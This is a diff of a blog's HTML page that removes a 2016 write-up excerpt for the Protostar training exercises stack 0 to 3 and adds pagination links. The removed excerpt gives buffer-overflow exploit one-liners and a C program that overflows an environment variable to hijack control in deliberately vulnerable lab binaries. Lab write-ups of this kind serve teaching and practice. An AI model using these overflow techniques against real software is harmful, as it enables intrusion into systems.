@@ -889,134 +889,13 @@
 
 
     
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/07/20/protostar/" itemprop="url">
-                  protostar
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-07-20T00:00:00+08:00" content="2016-07-20">
-              2016-07-20
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Writeups/" itemprop="url" rel="index">
-                    <span itemprop="name">Writeups</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/07/20/protostar/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/07/20/protostar/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h2 id="stack_0">stack 0</h2><p><code>python -c &quot;print &#39;A&#39;*65&quot; | ./stack0</code></p>
-<h2 id="stack_1">stack 1</h2><p><code>./stack1 $(python -c &quot;print &#39;dcba&#39;*17&quot;)</code></p>
-<h2 id="stack_2">stack 2</h2><h3 id="Exploit">Exploit</h3><figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> main(<span class="keyword">int</span> argc, const char <span class="variable">*argv</span>[])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> i               = <span class="number">0</span>;</span><br><span class="line">    char <span class="variable">*my_argv</span>[<span class="number">1</span>]    = &#123;NULL&#125;;</span><br><span class="line">    char <span class="variable">*my_env</span>[<span class="number">2</span>]     = &#123;NULL&#125;;</span><br><span class="line">    char <span class="keyword">env</span>[<span class="number">76</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">env</span>[<span class="number">0</span>] = <span class="string">'G'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">1</span>] = <span class="string">'R'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">2</span>] = <span class="string">'E'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">3</span>] = <span class="string">'E'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">4</span>] = <span class="string">'N'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">5</span>] = <span class="string">'I'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">6</span>] = <span class="string">'E'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">7</span>] = <span class="string">'='</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">72</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">env</span>[i] = <span class="string">'A'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">72</span>] = <span class="string">'\x0a'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">73</span>] = <span class="string">'\x0d'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">74</span>] = <span class="string">'\x0a'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">75</span>] = <span class="string">'\x0d'</span>;</span><br><span class="line"></span><br><span class="line">    my_env[<span class="number">0</span>] = <span class="keyword">env</span>;</span><br><span class="line">    my_env[<span class="number">1</span>] = NULL;</span><br><span class="line">    </span><br><span class="line">    execve(<span class="string">"./stack2"</span>, my_argv, my_env);    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="stack_3">stack 3</h2><p><code>python -c &quot;print &#39;A&#39;*64+&#39;\x24\x84\x04\x08&#39;&quot; | ./stack3</code></p>
-          <div class="post-more-link text-center">
-            <a class="btn" href="/2016/07/20/protostar/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+  </nav>
+
 
 
           </div>
